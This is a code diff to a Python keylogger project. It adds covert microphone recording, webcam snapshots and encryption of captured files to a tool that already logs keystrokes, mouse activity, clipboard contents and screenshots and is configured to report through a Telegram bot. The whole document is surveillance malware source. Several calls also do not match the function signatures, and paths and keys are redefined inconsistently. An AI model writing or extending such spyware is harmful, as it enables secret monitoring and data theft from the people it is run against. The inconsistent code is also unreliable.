@@ -36,6 +36,15 @@ import psutil  # Provides an interface for retrieving information on system util
 # Import requests for making HTTP requests.
 import requests  # Elegant and simple HTTP library for Python, built for human beings.
 
+import sounddevice as sd  # For recording audio from the microphone
+
+import numpy as np  # For handling audio data
+
+import scipy.io.wavfile as wav  # For saving recorded audio to a WAV file
+
+import cv2  # For capturing images from the webcam
+
+
 
 # File paths and settings
 keys_information = "key_log.txt"
@@ -46,6 +55,10 @@ screenshot_information = "screenshot.png"
 file_path = "/Users/yourusername/PycharmProjects/KeyLogger/"
 extend = "/"
 SEND_REPORT_EVERY = 60
+audio_information = "audio.wav"
+webcam_information = "webcam.jpg"
+aggregated_info = "aggregated_info.txt"
+encryption_key_file = file_path + extend + 'encryption_key.key'
 
 # Telegram settings
 telegram_token = 'your_telegram_bot_token'  # Replace with your token
@@ -150,6 +163,61 @@ def aggregate_data(key):
 
     except Exception as e:
         print(f"Error in aggregate_data: {e}")
+        
+def record_audio(file_name, duration, fs=44100):
+    print("Recording audio")
+    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='float64')
+    sd.wait()  # Wait until recording is finished
+    wav.write(file_name, fs, recording)  # Save as WAV file
+    print(f"Audio recording saved to {file_name}")
+    encrypt_file(file_name, encryption_key)  # Encrypt the audio file
+    
+def capture_webcam(file_name):
+    print("Capturing webcam image")
+    cam = cv2.VideoCapture(0)  # Initialize the webcam
+    ret, frame = cam.read()  # Read a frame
+    if ret:
+        cv2.imwrite(file_name, frame)  # Save the frame as an image file
+        print(f"Webcam image saved to {file_name}")
+        encrypt_file(file_name, encryption_key)  # Encrypt the image file
+    cam.release()
+
+def load_or_generate_key():
+    try:
+        with open(encryption_key_file, 'rb') as filekey:
+            key = filekey.read()
+    except FileNotFoundError:
+        key = Fernet.generate_key()
+        with open(encryption_key_file, 'wb') as filekey:
+            filekey.write(key)
+    return key
+
+encryption_key = load_or_generate_key()  # Load or generate key at the start
+
+# Encrypt function now uses the loaded/generated key
+def encrypt_file(file_name):
+    fernet = Fernet(encryption_key)
+    with open(file_name, 'rb') as file:
+        original = file.read()
+    encrypted = fernet.encrypt(original)
+    with open(file_name, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted)
+
+# Decryption function for demonstration, ensure secure key handling
+def decrypt_file(file_name):
+    fernet = Fernet(encryption_key)
+    with open(file_name, 'rb') as enc_file:
+        encrypted = enc_file.read()
+    decrypted = fernet.decrypt(encrypted)
+    with open(file_name, 'wb') as dec_file:
+        dec_file.write(decrypted)
+
+# Updating the ScreenCapture class to include a capture method for the webcam
+class EnhancedScreenCapture(ScreenCapture):
+    def capture_webcam(self):
+        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        webcam_filename = f"webcam_{timestamp}.jpg"
+        capture_webcam(self.file_path + webcam_filename)
 
 class KeyLogger:
     def __init__(self, log_file, key):
@@ -211,14 +279,24 @@ class ScreenCapture:
             encrypt_file(self.file_path + screenshot_filename, self.key)
             time.sleep(self.interval)
 
-# Main Execution
+
 if __name__ == "__main__":
-    print("Starting keylogger. Press Ctrl+C to stop.")
+    print("Starting keylogger with advanced data collection. Press Ctrl+C to stop.")
     try:
+        file_path = "path/to/your/directory"  # Define the base path for saving files
+        extend = "/file_prefix"  # A prefix or extension for organizing files
+        system_information = "system_info.txt"
+        clipboard_information = "clipboard.txt"
+        keys_information = "keystrokes.txt"
+        mouse_information = "mouse_log.txt"
+        audio_information = "audio.wav"
+        SEND_REPORT_EVERY = 120  # Time interval in seconds for sending reports or aggregating data
+
         encryption_key = generate_encryption_key()
         gather_system_information(file_path + extend + system_information, encryption_key)
         log_clipboard(file_path + extend + clipboard_information, encryption_key)
 
+        # Start the keylogger and mouselogger threads
         keylogger = KeyLogger(file_path + extend + keys_information, encryption_key)
         keylogger_thread = threading.Thread(target=keylogger.start)
         keylogger_thread.start()
@@ -227,14 +305,19 @@ if __name__ == "__main__":
         mouselogger_thread = threading.Thread(target=mouselogger.start)
         mouselogger_thread.start()
 
-        screen_capturer = ScreenCapture(file_path + extend, 5, 60, encryption_key)
+        # Start the screen capture thread with enhanced capabilities
+        screen_capturer = EnhancedScreenCapture(file_path + extend, 5, 60, encryption_key)
         screen_capture_thread = threading.Thread(target=screen_capturer.capture)
         screen_capture_thread.start()
 
+        # Record audio and capture webcam at intervals
+        audio_duration = 10  # Duration for audio recording in seconds
         while True:
+            record_audio(file_path + extend + audio_information, audio_duration, encryption_key)
+            screen_capturer.capture_webcam()  # Capture a webcam image
             time.sleep(SEND_REPORT_EVERY)
             aggregate_data(encryption_key)
-    
+
     except KeyboardInterrupt:
         stop_threads = True
         print("Shutting down...")
